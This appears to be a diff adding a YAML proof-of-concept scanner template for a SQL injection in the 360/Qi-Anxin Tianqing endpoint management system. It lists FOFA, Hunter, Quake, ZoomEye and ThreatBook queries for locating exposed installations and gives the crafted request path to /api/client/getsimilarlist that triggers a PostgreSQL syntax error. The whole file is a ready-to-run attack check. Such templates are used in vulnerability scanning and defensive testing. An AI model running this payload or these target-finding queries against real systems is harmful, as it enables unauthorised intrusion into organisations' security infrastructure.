@@ -1,0 +1,34 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="奇安信-天擎"
+    hunter-query: app.name="天擎终端安全管理系统"
+    quake-query: app:"奇安信天擎终端安全管理系统"
+    zoomeye-query: app:"Tianqing terminal management"
+    threatbook-query: app=360-天擎
+    cve: 
+    cnvd:
+    tips: postgresql | 联合注入
+    
+name: poc-yaml-360tianqing-getsimilarlist-sqli
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /api/client/getsimilarlist?status[0,1%29]=1&status[0]=1
+            headers:
+            body:         
+        expression: response.status == 200 && response.body_string.contains("Syntax error")
+expression: r0() 
